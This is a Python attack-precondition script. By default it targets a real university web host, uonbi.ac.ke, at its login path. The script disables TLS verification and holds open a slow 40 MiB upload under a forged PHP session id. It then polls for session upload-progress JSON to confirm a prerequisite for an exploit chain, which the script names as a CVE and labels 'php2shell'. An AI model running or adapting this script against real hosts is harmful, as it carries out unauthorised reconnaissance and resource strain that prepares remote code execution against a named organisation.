"""Positive proof that session.upload_progress is enabled.

PHP publishes a JSON progress blob on a second request sharing the session id
while the upload is still in flight. If that blob appears, the prerequisite for
CVE-2026-109619 chain A is met on this host.
"""
import json
import random
import re
import socket
import ssl
import string
import sys
import threading
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "uonbi.ac.ke"
PATH = sys.argv[2] if len(sys.argv) > 2 else "/user/login"
CTX = ssl._create_unverified_context()

sid = "sp" + "".join(random.choices(string.ascii_lowercase + string.digits, k=20))
BD = "----php2shell" + sid
FIELD = "PHP_SESSION_UPLOAD_PROGRESS"


def conn():
    return CTX.wrap_socket(socket.create_connection((HOST, 443), timeout=25),
                           server_hostname=HOST)


def slow_upload():
    s = conn()
    head = (f"POST {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUser-Agent: sesschk\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={BD}\r\n"
            "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n")
    s.sendall(head.encode())
    s.sendall((f"--{BD}\r\nContent-Disposition: form-data; name=\"{FIELD}\"\r\n\r\n"
               f"{sid}\r\n--{BD}\r\nContent-Disposition: form-data; "
               f'name="f"; filename="big.bin"\r\nContent-Type: application/octet-stream'
               "\r\n\r\n").encode())
    for _ in range(40):                      # ~40 MiB, streamed slowly
        s.sendall(b"%x\r\n" % (1 << 20) + b"A" * (1 << 20) + b"\r\n")
        time.sleep(0.35)
    s.sendall(b"0\r\n\r\n")
    try:
        s.recv(4096)
    except Exception:
        pass
    s.close()


def peek():
    s = conn()
    s.sendall((f"GET {PATH}?PHP_SESSION_UPLOAD_PROGRESS=1 HTTP/1.1\r\nHost: {HOST}\r\n"
               f"User-Agent: sesschk\r\n"
               f"Cookie: PHPSESSID={sid}\r\nConnection: close\r\n\r\n").encode())
    d = b""
    while True:
        try:
            c = s.recv(65536)
        except Exception:
            break
        if not c:
            break
        d += c
    s.close()
    return d


t = threading.Thread(target=slow_upload, daemon=True)
t.start()
time.sleep(6)

found = False
for _ in range(8):
    body = peek()
    status = body.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    print(f"  poll -> {status!r} len={len(body)} json={b'bytes_processed' in body}")
    if FIELD.encode() in body and b"bytes_processed" in body:
        m = re.search(rb"\{.*\}", body, re.S)
        print("session.upload_progress: ON")
        print((m.group(0)[:300] if m else body[:300]).decode("latin-1", "replace"))
        found = True
        break
    time.sleep(1.5)

if not found:
    print("session.upload_progress: not proven (no progress JSON seen)")
